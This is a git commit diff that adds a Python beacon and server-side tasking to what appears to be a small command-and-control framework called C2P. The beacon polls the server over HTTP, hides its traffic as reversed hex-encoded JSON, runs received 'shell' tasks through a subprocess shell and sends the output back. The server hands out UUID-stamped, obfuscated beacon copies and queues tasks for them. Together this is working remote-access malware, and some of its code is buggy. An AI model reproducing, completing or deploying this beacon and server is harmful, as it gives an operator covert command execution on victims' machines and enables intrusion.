e1ae49b095c6fd77136c2ba995b2ff24f6e4d922
charles <charles>
2025-07-30 00:40:26 +0200

    ok

--- src/beacons/beacon.py
+++ src/beacons/beacon.py
@@ -1,1 +1,79 @@
 import os
+import asyncio
+import http.client
+import json
+import uuid
+
+class C(object):
+    def __init__(self, host: str, secure: bool = False, interval: int = 10):
+        self.running = True
+        self.host = host
+        self.secure = secure
+        self.interval = interval
+        self.uuid = 'REPLACEUUID'
+        self.results = {}
+        self.tasks = {}
+        asyncio.run(self.start())
+    
+    async def stop(self):
+        self.running = False
+        await asyncio.sleep(5)
+        for taskId, task in self.tasks.items():
+            task.cancel()
+        return {}
+
+    async def shell(task):
+        proc = await asyncio.create_subprocess_shell(
+            task.cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
+        )
+        result = {}
+        result['stdout'], result['stderr'] = await proc.communicate()
+        result['returncode'] = proc.returncode
+        return result
+
+    def decode(self, data: bytes):
+        return json.loads(bytes.fromhex(data[::-1].decode()))
+
+    def encode(self, data) -> bytes :
+        return json.dumps(data).encode().hex()[::-1]
+
+    def newConn(self):
+        if self.secure:
+            conn = http.client.HTTPSConnection(self.host)
+        else:
+            conn = http.client.HTTPConnection(self.host)
+        return conn
+    
+    async def handleTask(self, taskId, task):
+        if task.action == 'stop':
+            result = await self.stop()
+
+        if task.action == 'shell':
+            result = await self.shell(task)
+
+        self.results[taskId] = result
+        
+    async def sync(self):
+        conn = self.newConn()
+        body = {}
+        body['results'] = self.results
+        conn.request("POST", f'/{self.uuid}', headers={"Host": self.host}, body=self.encode(body))
+        resp = conn.getresponse()
+        data = resp.read()
+        conn.close()
+
+        if resp.status != 200:
+            return
+        
+        # Remove results
+        for taskId in body['results'].keys():
+            del self.results[taskId]
+        
+        data = self.decode(data)
+        for taskId, task in data['tasks'].items():
+            self.tasks[taskId] = asyncio.create_task(self.handleTask(taskId, task))
+    
+    async def start(self):
+        while self.running:
+            await self.sync()
+            await asyncio.sleep(self.interval)
--- src/core/core.py
+++ src/core/core.py
@@ -11,12 +11,54 @@ from pathlib import Path
 from src.core.logger_config import configure_logger, logger
 
 class Beacon(object):
+    """Beacon object"""
     def __init__(self, language="python"):
         self.language = language
         self.uuid = uuid.uuid4()
         self.last_seen = time.time()
+        self.tasksinfos = {}
+        self.tasks = {}
+    
+    def consumeTasks(self):
+        self.last_seen = time.time()
+        tasks = {}
+        for taskid, task in self.tasks.items():
+            if self.tasksinfos[taskid]['state'] == 'pending':
+                self.tasksinfos[taskid]['state'] = 'delivered'
+                if 'name' in self.tasksinfos[taskid].keys():
+                    name = self.tasksinfos[taskid]['name']
+                    msg = f"📤​​ {self.uuid.hex} delivered task '{name}' {taskid} "
+                else:
+                    msg = f"📤​​ {self.uuid.hex} delivered task {taskid} "
+                logger.info(msg)
+                tasks[taskid]=task
+        return tasks
+
+    def newTask(self, task):
+        taskid = uuid.uuid4().hex
+        if 'task' not in task or type(task.task) != dict:
+            return None
+        else:
+            self.tasks[taskid] = task.task
+
+        if 'info' in task.keys() and type(task.info) == dict:
+            self.tasksinfos[taskid] = task.info
+        else:
+            self.tasksinfos[taskid] = {}
+
+        self.tasksinfos[taskid]['state'] = 'pending'
+        self.tasksinfos[taskid]['created'] = time.time()
+
+        if 'name' in self.tasksinfos[taskid].keys():
+            name = self.tasksinfos[taskid]['name']
+            msg = f"📦​​ {self.uuid.hex} new task '{name}' {taskid}"
+        else:
+            msg = f"📦​​ {self.uuid.hex} new task {taskid}"
+        logger.info(msg)
+        return taskid
 
 class C2P(object):
+    """C2P class that hold servers and beacons"""
     running = True
     apirunner = None
     extrunner = None
@@ -24,20 +66,55 @@ class C2P(object):
     beacons = {}
     client_max_size = 1024**2*99999
     default_ext_host = "0.0.0.0"
-    default_ext_port = 5818
+    default_ext_port = 8888
     
     async def start(self):
+        """Start C2P server class"""
         await self.ApiServer()
         await self.ExtServer()
+        await self.AddListener(self.default_ext_host, self.default_ext_port)
 
     async def cleanup(self):
+        """Clean before exit"""
         await self.apirunner.cleanup()
         await self.extrunner.cleanup()
 
+    async def GetBeacon(self, beaconuuid):
+        beaconuuid = uuid.UUID(beaconuuid)
+        if beaconuuid.hex not in self.beacons.keys():
+            beacon = Beacon()
+            beacon.uuid = beaconuuid
+            self.beacons[beacon.uuid.hex] = beacon
+            msg = f"♻️​  Old beacon : {beacon.uuid.hex}"
+            logger.info(msg)
+        else:
+            beacon = self.beacons[beaconuuid.hex]
+        return beacon
+
+    def encode(self, data):
+        return json.dumps(data).encode().hex()[::-1]
+    
+    def decode(self, data):
+        if type(data) == bytes:
+            data = data.decode()
+        return json.loads(bytes.fromhex(data[::-1]))
+    
+    async def WUpdateBeacon(self, req):
+        beaconuuid = req.match_info.get('beaconuuid')
+        beacon = await self.GetBeacon(beaconuuid)
+
+        data = await req.text()
+        data = self.decode(data)
+
+        update = {"tasks": beacon.consumeTasks()}
+        return web.Response(body=self.encode(update))
+
     async def ExtServer(self):
+        """Define external listener routes"""
         app = web.Application(client_max_size=self.client_max_size)
         app.add_routes([
-        web.get('/py', self.InitPyBeacon),
+        web.get('/', self.WInitPyBeacon),
+        web.post('/{beaconuuid}', self.WUpdateBeacon),
         ])
 
         runner = web.AppRunner(app)
@@ -46,12 +123,13 @@ class C2P(object):
         self.extrunner = runner
 
     async def ApiServer(self):
+        """Start API server"""
         app = web.Application(client_max_size=self.client_max_size)
         app.add_routes([
-        web.get('/listeners', self.GetListeners),
-        web.post('/stop', self.Stop),
-        web.post('/listener/del', self.DeleteListener),
-        web.post('/listener/add', self.AddListener),
+        web.get('/listeners', self.WGetListeners),
+        web.post('/stop', self.WStop),
+        web.post('/listener/del', self.WDeleteListener),
+        web.post('/listener/add', self.WAddListener),
         ])
 
         runner = web.AppRunner(app)
@@ -62,67 +140,80 @@ class C2P(object):
         port = 7641
         site = web.TCPSite(runner, host, port, ssl_context=ssl_context)
         await site.start()
+        msg = f"✨​ API server {host}:{port}"
+        logger.info(msg)
 
         self.listeners[f"{host}:{port}"] = site
         self.apirunner = runner
 
-    async def Stop(self, req):
+    async def WStop(self, req):
+        """WEB - Stop C2P"""
         self.running = False
-        msg = "Stop request sent"
+        msg = "🔴 Stop request sent"
         logger.info(msg)
         return web.json_response({"msg": msg})
 
-    async def DeleteListener(self, req):
+    async def WDeleteListener(self, req):
+        """WEB - Remove listener"""
         data = await req.post()
         host = data.get('host', self.default_ext_host)
         port = data.get('port', self.default_ext_port)
         key = f"{host}:{port}"
         if key not in self.listeners.keys():
-            msg = "No active listener found"
+            msg = "❓ No active listener found"
             return web.json_response({"msg": msg})
         
         await self.listeners[key].stop()
         del self.listeners[key]
 
-        msg = f"Removed listener {host}:{port}"
+        msg = f"​❌​ Removed listener {host}:{port}"
         logger.info(msg)
         return web.json_response({"msg": msg})
 
-    async def AddListener(self, req):
+    async def AddListener(self, host, port, ssl_context=None):
+        """Add new external listener"""
+        site = web.TCPSite(self.extrunner, host, port, ssl_context=ssl_context)
+        await site.start()
+        self.listeners[f"{host}:{port}"] = site
+        msg = f"​🚀​ New listener {host}:{port}"
+        logger.info(msg)
+        return site
+
+    async def WAddListener(self, req):
+        """WEB - Add new external listener"""
         data = await req.post()
         host = data.get('host', self.default_ext_host)
         port = data.get('port', self.default_ext_port)
         key = f"{host}:{port}"
         if key in self.listeners.keys():
-            msg = "Already listening"
+            msg = "❓​​ Already listening"
             return web.json_response({"msg": msg})
 
-        ssl_context = None
-        site = web.TCPSite(self.extrunner, host, port, ssl_context=ssl_context)
-        await site.start()
-        self.listeners[key] = site
-
-        msg = f"New listener {host}:{port}"
-        logger.info(msg)
+        await self.AddListener(host, port)
+        msg = f"​🚀​ New listener {host}:{port}"
         return web.json_response({"msg": msg})
     
-    async def GetListeners(self, req):
+    async def WGetListeners(self, req):
+        """WEB - List external listeners"""
         listeners = [x for x in self.listeners.keys()]
         return web.json_response(listeners)
 
-    async def InitPyBeacon(self, req):
+    async def WInitPyBeacon(self, req):
+        """WEB - Serve python beacon"""
         beacon = Beacon()
-        self.beacons[beacon.uuid] = beacon
-        msg = f"New beacon : {beacon.uuid}"
+        self.beacons[beacon.uuid.hex] = beacon
+        msg = f"🌱​ New beacon : {beacon.uuid.hex}"
         logger.info(msg)
 
         agent_file_path = Path(__file__).parent.parent / "beacons" / "beacon.py"
         with open(agent_file_path, 'rb') as f:
-            content = f.read().hex()[::1]
-            
+            content = f.read()
+        content = content.replace(b'REPLACEUUID', f"{beacon.uuid.hex}".encode())
+        content = content.hex()[::-1]
         return web.Response(text=content)
 
-async def Main():
+async def StartServer():
+    """Start server"""
     configure_logger()
     c2p = C2P()
     await c2p.start()
@@ -130,12 +221,13 @@ async def Main():
         try: await asyncio.sleep(0.5)
         except: 
             print("")
-            logger.info("Exception received")
+            logger.info("🌶️​  Exception received")
             break
     
-    logger.info("Ending C2P")
-    await c2p.cleanup() 
-    logger.info("Gracefull exit")
+    logger.info("​🧹​​ Ending C2P")
+    await c2p.cleanup()
+    logger.info("👋​ Graceful exit")
 
 def main():
-    asyncio.run(Main())
+    """Start async"""
+    asyncio.run(StartServer())
